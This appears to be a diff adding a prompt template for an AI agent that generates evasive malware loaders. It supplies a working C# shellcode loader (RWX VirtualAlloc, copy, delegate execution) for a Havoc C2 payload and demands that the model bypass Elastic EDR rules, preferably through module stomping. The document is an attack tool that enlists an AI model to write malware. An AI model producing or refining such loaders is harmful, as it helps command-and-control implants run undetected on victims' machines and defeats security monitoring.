@@ -1,0 +1,101 @@
+
+# Shellcode Loader Generation - Iteration 1
+**Target Programming Language: C# / .NET**
+
+## Shellcode Information
+- File path: C:\Users\terada\Documents\GitHub\evasiveAIAgent_LangGraph\tests\havoc.bin
+- Size: 106495 bytes
+- Architecture: 64-bit (x64)
+- Format: raw binary
+- Entry point: start of buffer
+
+## CRITICAL Requirements
+Generate a Windows 64-bit shellcode loader in C# / .NET that:
+1. **File-based loading**: Read shellcode from the first argument (args[0]) - DO NOT hardcode bytes
+2. **EDR evasion**: Bypass all detected Elastic rules
+
+
+## File Reading Template (you can modify this):
+```csharp
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class Program
+{
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
+    const uint MEM_COMMIT = 0x1000;
+    const uint MEM_RESERVE = 0x2000;
+    const uint MEM_RELEASE = 0x8000;
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate void RunShellcode();
+
+    public static void Main(string[] args)
+    {
+        if (args.Length < 1) return;
+        byte[] payload = File.ReadAllBytes(args[0]);
+
+        // Base execution template (Modify this based on evasion strategy)
+        IntPtr execMem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        Marshal.Copy(payload, 0, execMem, payload.Length);
+
+        RunShellcode func = (RunShellcode)Marshal.GetDelegateForFunctionPointer(execMem, typeof(RunShellcode));
+        func();
+        
+        VirtualFree(execMem, 0, MEM_RELEASE);
+    }
+}
+```
+
+
+## First Iteration
+Generate a basic but functional loader that:
+1. Reads shellcode from file
+2. Uses the requested/enabled memory allocation technique from the available techniques list. 
+   - You may choose a more advanced technique if you are confident it is robust and enabled.
+3. Establishes a working baseline for further evasion improvements
+
+IMPORTANT: The loader MUST read the shellcode from the file path provided as arguments.
+Do NOT hardcode any shellcode bytes.
+
+
+## Available Evasion Techniques (Reference)
+The following techniques are available in your arsenal. You are not forced to use them, but they are options to consider if they help bypass the specific rules detected:
+
+### Memory Techniques
+- **module_stomping** [USER-PREFERRED]: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory. (bypasses: unbacked memory execution, private memory execution, process creation via shellcode)
+
+
+### CRITICAL: Preferred Techniques
+The user has specifically requested you to prioritize using the following evasion techniques:
+- **module_stomping**
+You MUST design your code to use at least one of these preferred techniques if possible.
+
+## Output Format
+Provide your response in this format:
+
+### EXPLANATION
+Step-by-step reasoning for your changes:
+1. Analyze the failure/detection (what specifically triggered it?)
+2. Explain the new evasion strategy (why will this bypass the specific rule/error?)
+3. List the techniques selected and why
+
+### TECHNIQUES_USED
+- Technique1
+- Technique2
+
+### CODE
+```csharp
+// Your complete, compilable C# / .NET code here
+```
+
+Make sure the code:
+1. Is complete and ready to execute or compile on Windows
+2. **CRITICAL: Reads shellcode from file argument - DO NOT embed shellcode bytes**
